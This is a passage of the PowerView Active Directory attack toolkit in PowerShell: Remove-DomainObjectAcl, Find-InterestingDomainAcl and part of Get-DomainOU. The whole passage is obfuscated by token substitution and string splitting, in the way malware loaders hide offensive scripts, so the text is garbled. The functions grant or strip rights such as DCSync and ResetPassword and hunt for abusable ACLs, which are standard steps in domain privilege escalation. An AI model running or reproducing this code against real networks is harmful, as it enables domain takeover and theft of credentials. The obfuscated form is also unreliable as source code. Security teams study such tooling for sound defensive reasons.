                    Write-Verbose Zfr[Add-DomainObjectAcl] Error granting principal gIF1(gIF1PrincipalObject.distinguishedname) 41agIF1Rights41a on gIF1(gIF1TargetObject.Properties.distinguishedname) : gIF1_Zfr
                }
            }
        }
    }
}


function Remove-DomainObjectAcl {
<#
.SYNOPSIS

Removes an ACL from a specific active directory object.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObject  

.DESCRIPTION

This function modifies the ACL/ACE entries for a given Active Directory
target object specified by -TargetIdentity. Available -Rights are
41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a, or a manual extended
rights GUID can be set with -RightsGUID. These rights are removed from the target
object for the specified -PrincipalIdentity.

.PARAMETER TargetIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain object to modify ACLs for. Required. Wildcards accepted.

.PARAMETER TargetDomain

Specifies the domain for the TargetIdentity to use for the modification, defaults to the current domain.

.PARAMETER TargetLDAPFilter

Specifies an LDAP query string that is used to filter Active Directory object targets.

.PARAMETER TargetSearchBase

The LDAP source to search through for targets, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER PrincipalIdentity

A SamAccountName (e.g. harmj0y), DistinguishedName (e.g. CN=harmj0y,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1108), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d201)
for the domain principal to add for the ACL. Required. Wildcards accepted.

.PARAMETER PrincipalDomain

Specifies the domain for the TargetIdentity to use for the principal, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Rights

Rights to add for the principal, 41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a.
Defaults to 41aAll41a.

.PARAMETER RightsGUID

Manual GUID representing the right to add to the target.

.EXAMPLE

gIF1UserSID = Get-DomainUser user U9B Sel'+'ect-Object -ExpandProperty objectsid
Get-DomainObjectACL user2 -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1UserSID}

[no results returned]

Add-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1UserSID }

AceQualifier           : AccessAllowed
ObjectDN               : CN=user2,CN=Users,DC=testlab,DC=local
ActiveDirectoryRights  : ExtendedRight
ObjectAceType          : User-Force-Change-Password
ObjectSID              : S-1-5-21-883232822-274137685-4173207997-2105
InheritanceFlags       : None
BinaryLength           : 56
AceType                : AccessAllowedObject
ObjectAceFlags         : ObjectAceTypePresent
IsCallback             : False
PropagationFlags       : None
SecurityIdentifier     : S-1-5-21-883232822-274137685-4173207997-2104
AccessMask             : 256
AuditFlags             : None
IsInherited            : False
AceFlags               : None
InheritedObjectAceType : All
OpaqueLength           : 0


Remove-DomainObjectAcl -TargetIdentity user2 -PrincipalIdentity user -Rights ResetPassword

Get-DomainObjectACL user2 -ResolveGUIDs U9B Where-Object {gIF1_.securityidentifier -eq gIF1UserSID}

[no results returned]

.LINK

https://social.technet.microsoft.com/Forums/windowsserver/en-US/df3bfd33-c070-4a9c-be98-c4da6e591a0a/forum-faq-using-powershell-to-assign-permissions-on-active-directory-objects?forum=winserverpowershell
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDistinguishedName41a, 41aSamAccountName41a, 41aName41a)]
 '+'       [String[]]
        gIF1TargetIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1TargetDomain,

        [ValidateNotNullOrEmpty'+'()]
        [Alias(41aFilter41a)]
        [String]
        gIF1TargetLDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1T'+'argetSearchBase,

        [Parameter(Mandatory = gIF1True)]
        [ValidateNotNullOrEmpt'+'y()]
        [String[]]
        gIF1PrincipalIdentity,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1PrincipalDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [ValidateSet(41aAll41a, 41aResetPassword41a, 41aWriteMembers41a, 41aDCSync41a)]
        [String]
        gIF1Rights = 41aAll41a,

        [Guid]
        gIF1RightsGUID
    )

    BEGIN {
        gIF1TargetSearcherArguments = @{
            41aProperties41a = 41adistinguishedname41a
            41aRaw41a = gIF1True
        }
        if (gIF1PSBoundParameters[41aTargetDomain41a]) { gIF1TargetSearcherArguments[41aDomain41a] = gIF1TargetDomain }
        if (gIF1PSBoundParameters[41aTargetLDAPFilter41a]) { gIF1TargetSearcherArguments[41aLDAPFilter41a] = gIF1TargetLDAPFilter }
        if (gIF1PSBoundParameters[41aTargetSearchBase41a]) { gIF1TargetSearcherArguments[41aSearchBase41a] = gIF1TargetSearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1TargetSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1TargetSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1TargetSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1TargetSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1TargetSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1TargetSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1PrincipalSearcherArguments = @{
           '+' 41aIdentity41a = gIF1PrincipalIdentity
            41aProperties41a = 41adistinguishedname,objectsid41a
        }
        if (gIF1PSBoundParameters[41aPrincipalDomain41a]) { gIF1PrincipalSearcherArguments[41aDomain41a] = gIF1PrincipalDomain }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1PrincipalSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1PrincipalSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1PrincipalSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1PrincipalSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1PrincipalSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1PrincipalSearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1Principals = Get-DomainObject @PrincipalSearcherArguments
        if (-not gIF1Principals) {
            throw ZfrUnable to resolve principal: gIF1PrincipalIdentityZfr
        }
    }

    PROCESS {
        gIF1TargetSearcherArguments[41aIdentity41a] = gIF1TargetIdentity
        gIF1Targets = Get-DomainObject @TargetSearcherArguments

        ForEach (gIF1TargetObject in gIF1Targets) {

            gIF1InheritanceType = [System.DirectoryServices.ActiveDirectorySecurityInheritance] 41aNone41a
            gIF1ControlType = [System.Security.AccessControl.AccessControlType] 41aAllow41a
            gIF1ACEs = @()

            if (gIF1RightsGUID) {
                gIF1GUIDs = @(gIF1RightsGUID)
            }
            else {
                gIF1GUIDs = Switch (gIF1Rights) {
                    # ResetPassword doesn41at need to know the user41as current password
                    41aResetPassword41a { 41a00299570-246d-11d0-a768-00aa006e052941a }
        '+'            # allows for the modification of group membership
                    41aWriteMembers41a { 41abf9679c0-0de6-11d0-a285-00aa003049e241a }
          '+'          # 41aDS-Replication-Get-Changes41a = 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
                    # 41aDS-Replication-Get-Changes-All41a = 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
                    # 41aDS-Replication-Get-Changes-In-Filtered-Set41a = 89e95b76-444d-4c62-991a-0facbeda640c
                    #   when applied to a domain41as ACL, allows for the use of DCSync
                    41aDCSync41a '+'{ 41a1131f6aa-9c07-11d1-f79f-00c04fc2dcd241a, 41a1131f6ad-9c07-11d1-f79f-00c04fc2dcd241a, 41a89e95b76-444d-4c62-991a-0facbeda640c41a}
                }
            }

            ForEach (gIF1PrincipalObject in gIF1Principals) {
                Write-Verbose Zfr[Remove-DomainObjectAcl] Removing principal gIF1(gIF1PrincipalObject.distinguishedname) 41agIF1Rights41a from gIF1(gIF1TargetObject.Properties.distinguishedname)Zfr

                try {
                    gIF1Identity = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]gIF1PrincipalObject.objectsid)

                    if (gIF1GUIDs) {
                        ForEach (gIF1GUID in gIF1GUIDs) {
                            gIF1NewGUID = New-Object Guid gIF1GUID
                            gIF1ADRights = [System.DirectoryServices.ActiveDirectoryRights] 41aExtendedRight41a
                            gIF1ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule gIF1Identity, gIF1ADRights, gIF1ControlType, gIF1NewGUID, gIF1InheritanceType
                        }
                    }
                    else {
                        # deault to GenericAll rights
                        gIF1ADRights = [System.DirectoryServices.ActiveDirectoryRights] 41aGenericAll41a
                        gIF1ACEs += New-Object System.DirectoryServices.ActiveDirectoryAccessRule gIF1Identity, gIF1ADRights, gIF1ControlType, gIF1InheritanceType
                    }

                    # remove all the specified ACEs from the specified object directory entry
                    ForEach (gIF1ACE in gIF1ACEs) {
                        Write-Verbose Zfr[Remove-DomainObjectAcl] Granting principal gIF1(gIF1PrincipalObject.distinguishedname) rights GUID 41agIF1(gIF1ACE.ObjectType)41a on gIF1(gIF1TargetObject.Properties.distinguishedname)Zfr
                        gIF1TargetEntry = gIF1TargetObject.GetDirectoryEntry()
                        gIF1TargetEntry.PsBase.Options.SecurityMasks = 41aDacl41a
                        gIF1TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule(gIF1ACE)
                        gIF1TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose Zfr[Remove-DomainObjectAcl] Error removing principal gIF1(gIF1PrincipalObject.distinguishedname) 41agIF1Rights41a from gIF1(gIF1TargetObject.Properties.distinguishedname) : gIF1_Zfr
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {
<#
.SYNOPSIS

Finds object ACLs in the current (or specified) domain with modification
rights set to non-built in objects.

Thanks Sean Metcalf (@pyrotek3) for the idea and guidance.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainObjectAcl, Get-DomainObject, Convert-ADName  

.DESCRIPTION

This function enumerates the ACLs for every object in the domain with Get-DomainObjectAcl,
and for each returned ACE entry it checks if principal security identifier
is *-1000 (meaning the account is not built in), and also checks if the rights for
the ACE mean the object can be modified by the principal. If these conditions are met,
then the security identifier SID is translated, the domain object is retrieved, and
additional IdentityReference* information is appended to the output object.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER ResolveGUIDs

Switch. Resolve GUIDs to their display names.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Find-InterestingDomainAcl

Finds interesting object ACLS in the current domain.

.EXAMPLE

Find-InterestingDomainAcl -Domain dev.testlab.local -ResolveGUIDs

Finds interesting object ACLS in the ev.testlab.local domain and
resolves rights GUIDs to display names.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Find-InterestingDomainAcl -Credential gIF1Cred -ResolveGUIDs

.OUTPUTS

PowerView.ACL

Custom PSObject with ACL entries.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.ACL41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aDomainName41a, 41aName41a)]
        [String]
        gIF1Domain,

        [Switch]
        gIF1ResolveGUIDs,

        [String]
        [ValidateSet(41aAll41a, 41aResetPassword41a, 41aWriteMembers41a)]
        gIF1RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [Switch]
        gIF1Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        gIF1ACLArguments = @{}
        if (gIF1PSBoundParameters[41aResolveGUIDs41a]) { gIF1ACLArguments[41aResolveGUIDs41a] = gIF1ResolveGUIDs }
        if (gIF1PSBoundParameters[41aRightsFilter41a]) { gIF1ACLArguments[41aRightsFilter41a] = gIF1RightsFilter }
        if (gIF1PSBoundParameters[41aLDAPFilter41a]) { gIF1ACLArguments[41aLDAPFilter41a] = gIF1LDAPFilter }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1ACLArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ACLArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ACLArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ACLArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ACLArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ACLArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ACLArguments[41aCredential41a] = gIF1Credential }

        gIF1ObjectSearcherArguments = @{
            41aProperties41a = 41asamaccountname,objectclass41a
            41aRaw41a = gIF1True
        }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ObjectSearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1ObjectSearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1ObjectSearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1ObjectSearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1ObjectSearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ObjectSearcherArguments[41aCredential41a] = gIF1Credential }

        gIF1ADNameArguments = @{}
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1ADNameArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1ADNameArguments[41aCredential41a] = gIF1Credential }

        # ongoing list of built-up SIDs
        gIF1ResolvedSIDs = @{}
    }

    PROCESS {
        if (gIF1PSBoundParameters[41aDomain41a]) {
            gIF1ACLArguments[41aDomain41a] = gIF1Domain
            gIF1ADNameArguments[41aDomain41a] = gIF1Domain
        }

        Get-DomainObjectAcl @ACLArguments U9B ForEach-Object {

            if ( (gIF1_.ActiveDirectoryRights -match 41aGenericAllU9BWriteU9BCreateU9BDelete41a) -or ((gIF1_.ActiveDirectoryRights -match 41aExtendedRight41a) -and (gIF1_.AceQualifier -match 41aAllow41a))) {
                # only process SIDs > 1000
                if (gIF1_.SecurityIdentifier.Value -match 41a^S-1-5-.*-[1-9]YwWd{3,}gIF141a) {
                    if (gIF1ResolvedSIDs[gIF1_.SecurityIdentifier.Value]) {
                        gIF1IdentityReferenceName, gIF1IdentityReferenceDomain, gIF1IdentityReferenceDN, gIF1IdentityReferenceClass = gIF1ResolvedSIDs[gIF1_.SecurityIdentifier.Value]

                        gIF1InterestingACL = New-Object PSObject
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectDN41a gIF1_.ObjectDN
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aAceQualifier41a gIF1_.AceQualifier
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aActiveDirectoryRights41a gIF1_.ActiveDirectoryRights
                        if (gIF1_.ObjectAceType) {
                            gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectAceType41a gIF1_.ObjectA'+'ceType
                        }
                        else {
                            gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectAceType41a 41aNone41a
                        }
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aAceFlags41a gIF1_.AceFlags
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aAceType41a gIF1_.AceType
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aInheritanceFlags41a gIF1_.InheritanceFlags
             '+'           gIF1InterestingACL U9B Add-Member NoteProperty 41aSecurityIdentifier41a gIF1_.SecurityIdentifier
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceName41a gIF1IdentityReferenceName
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceDomain41a gIF1IdentityReferenceDomain
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceDN41a gIF1IdentityReferenceDN
                        gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceClass41a gIF1IdentityReferenceClass
                        gIF1InterestingACL
                    }
                    else {
                        gIF1IdentityReferenceDN = Convert-ADName -Identity gIF1_.SecurityIdentifier.Value -Outp'+'utType DN @ADNameArguments
                        # ZfrIdentityReferenceDN: gIF1IdentityReferenceDNZfr

                        if (gIF1IdentityReferenceDN) {
                            gIF1IdentityReferenceDom'+'ain = gIF1IdentityReferenceDN.SubString(gIF1IdentityReferenceDN.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
                            # ZfrIdentityReferenceDomain: gIF1IdentityReferenceDomainZfr
                            gIF1ObjectSearcherArguments[41aDomain41a] = gIF1IdentityReferenceDomain
                            gIF1ObjectSearcherArguments[41aIdentity41a] = gIF1IdentityReferenceDN
                            # ZfrIdentityReferenceDN: gIF1IdentityReferenceDNZfr
                            gIF1Object = Get-DomainObject @ObjectSearcherArguments

                            if (gIF1Object) {
                                gIF1IdentityReferenceName = gIF1Object.Properties.samaccountname[0]
                                if (gIF1Object.Properties.objectclass -match 41acomputer41a) {
                                    gIF1IdentityReferenceClass = 41acomputer41a
                                }
                                elseif (gIF1Object.Properties.objectclass -match 41agroup41a) {
                                    gIF1IdentityReferenceClass = 41agroup41a
                                }
                                elseif (gIF1Object.Properties.objectclass -match 41auser41a) {
                                    gIF1IdentityReferenceClass = 41auser41a
                                }
                                else {
                                    gIF1IdentityReferenceClass = gIF1Null
                                }

                                # save so we don41at look up more than once
                                gIF1ResolvedSIDs[gIF1_.SecurityIdentifier.Value] = gIF1IdentityReferenceName, gIF1IdentityReferenceDomain, gIF1IdentityReferenceDN, gIF1IdentityReferenceClass

                                gIF1InterestingACL = New-Object PSObject
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectDN41a gIF1_.ObjectDN
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aAceQualifier41a gIF1_.AceQualifier
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aActiveDirectoryRights41a gIF1_.ActiveDirectoryRights
                                if (gIF1_.ObjectAceType) {
                                    gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectAceType41a gIF1_.ObjectAceType
                                }
                                else {
                                    gIF1InterestingACL U9B Add-Member NoteProperty 41aObjectAceType41a 41aNone41a
                                }
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aAceFlags41a gIF1_.AceFlags
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aAceType41a gIF1_.AceType
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aInheritanceFlags41a gIF1_.InheritanceFlags
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aSecurityIdentifier41a gIF1_.SecurityIdentifier
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceName41a gIF1IdentityReferenceName
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceDomain41a gIF1IdentityReferenceDomain
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceDN41a gIF1IdentityReferenceDN
                                gIF1InterestingACL U9B Add-Member NoteProperty 41aIdentityReferenceClass41a gIF1IdentityReferenceClass
                                gIF1InterestingACL
                            }
                        }
                        else {
                            Write-Warning Zfr[Find-InterestingDomainAcl] Unable to convert SID 41agIF1(gIF1_.SecurityIdentifier.Value )41a to a distinguishedname with Convert-ADNameZfr
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {
<#
.SYNOPSIS

Search for all organization units (OUs) or specific OU objects in AD.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher, Convert-LDAPProperty  

.DESCRIPTION

Builds a directory searcher object using Get-DomainSearcher, builds a custom
LDAP filter based on targeting/filter parameters, and searches for all objects
matching the criteria. To only return specific properties, use
Zfr-Properties whencreated,usnchanged,...Zfr. By default, all OU objects for
the current domain are returned.

.PARAMETER Identity

An OU name (e.g. TestOU), DistinguishedName (e.g. OU=TestOU,DC=testlab,DC=local), or
GUID (e.g. 8a9ba22a-8977-47e6-84ce-8c26af4e1e6a). Wildcards accepted.

.PARAMETER GPLink

Only return OUs with the specified GUID in their gplink property.

.PARAMETER Domain

Spec'+'ifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. ZfrLDAP://OU=secret,DC=testlab,DC=localZfr
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of 41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a.

.PARAMETER FindOne

Only return one result object.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.PARAMETER Raw

Switch. Return raw results instead of translating the fields into a custom PSObject.

.EXAMPLE

Get-DomainOU

Returns the current OUs in the domain.

.EXAMPLE

Get-DomainOU *admin'+'* -Domain testlab.local

Returns all OUs with ZfradminZfr in their name in the testlab.local domain.

.EXAMPLE

Get-DomainOU -GPLink ZfrF260B76D-55C8-46C5-BEF1-9016DD98E272Zfr

Returns all OUs with linked to the specified group policy object.

.EXAMPLE

Zfr*admin*Zfr,Zfr*server*Zfr U9B Get-DomainOU

Search for OUs with the specific names.

.EXAMPLE

gIF1SecPassword = ConvertTo-SecureString 41aPassword123!41a -AsPlainText -Force
gIF1Cred = New-Object System.Management.Automation.PSCredential(41aTESTLABYwWdfm.a41a, gIF1SecPassword)
Get-Domain'+'OU -Credential gIF1Cred

.OUTPUTS

PowerView.OU

Custom PSObject with translated OU property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(41aPSShouldProcess41a, 41a41a)]
    [OutputType(41aPowerView.OU41a)]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = gIF1True, ValueFromPipelineByPropertyName = gIF1True)]
        [Alias(41aName41a)]
        [String[]]
        gIF1Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias(41aGUID41a)]
        gIF1GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        gIF1Domain,

        [ValidateNotNullOrEmpty()]
        [Alias(41aFilter41a)]
        [String]
        gIF1LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        gIF1Properties,

        [ValidateNotNullOrEmpty()]
        [Alias(41aADSPath41a)]
        [String]
        gIF1SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(41aDomainController41a)]
        [String]
        gIF1Server,

        [ValidateSet(41aBase41a, 41aOneLevel41a, 41aSubtree41a)]
        [String]
        gIF1SearchScope = 41aSubtree41a,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        gIF1ServerTimeLimit,

        [ValidateSet(41aDacl41a, 41aGroup41a, 41aNone41a, 41aOwner41a, 41aSacl41a)]
        [String]
        gIF1SecurityMasks,

        [Switch]
        gIF1Tombstone,

        [Alias(41aReturnOne41a)]
        [Switch]
        gIF1FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        gIF1Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        gIF1Raw
    )

    BEGIN {
        gIF1SearcherArguments = @{}
        if (gIF1PSBoundParameters[41aDomain41a]) { gIF1SearcherArguments[41aDomain41a] = gIF1Domain }
        if (gIF1PSBoundParameters[41aProperties41a]) { gIF1SearcherArguments[41aProperties41a] = gIF1Properties }
        if (gIF1PSBoundParameters[41aSearchBase41a]) { gIF1SearcherArguments[41aSearchBase41a] = gIF1SearchBase }
        if (gIF1PSBoundParameters[41aServer41a]) { gIF1SearcherArguments[41aServer41a] = gIF1Server }
        if (gIF1PSBoundParameters[41aSearchScope41a]) { gIF1SearcherArguments[41aSearchScope41a] = gIF1SearchScope }
        if (gIF1PSBoundParameters[41aResultPageSize41a]) { gIF1SearcherArguments[41aResultPageSize41a] = gIF1ResultPageSize }
        if (gIF1PSBoundParameters[41aServerTimeLimit41a]) { gIF1SearcherArguments[41aServerTimeLimit41a] = gIF1ServerTimeLimit }
        if (gIF1PSBoundParameters[41aSecurityMasks41a]) { gIF1SearcherArguments[41aSecurityMasks41a] = gIF1SecurityMasks }
        if (gIF1PSBoundParameters[41aTombstone41a]) { gIF1SearcherArguments[41aTombstone41a] = gIF1Tombstone }
        if (gIF1PSBoundParameters[41aCredential41a]) { gIF1SearcherArguments[41aCredential41a] = gIF1Credential }
        gIF1OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if (gIF1OUSearcher) {
            gIF1IdentityFilter = 41a41a
            gIF1Filter = 41a41a
            gIF1Identity U9B Where-Object {gIF1_} U9B ForEach-Object {
                gIF1IdentityInstance = gIF1_.Replace(41a(41a, 41aYwW2841a).Replace(41a)41a, 41aYwW2941a)
                if (gIF1IdentityInstance -match 41a^OU=.*41a) {
                    gIF1IdentityFilter += Zfr(distinguishedname=gIF1IdentityInstance)Zfr
                    if ((-not gIF1PSBoundParameters[41aDomain41a]) -and (-not gIF1PSBoundParameters[41aSearchBase41a])) {
                        # if a -Domain isn41at explicitly set, extract the object domain out of the distinguishedname
                        #   and rebuild the domain searcher
                        gIF1IdentityDomain = gIF1IdentityInstance.SubString(gIF1IdentityInstance.IndexOf(41aDC=41a)) -replace 41aDC=41a,41a41a -replace 41a,41a,41a.41a
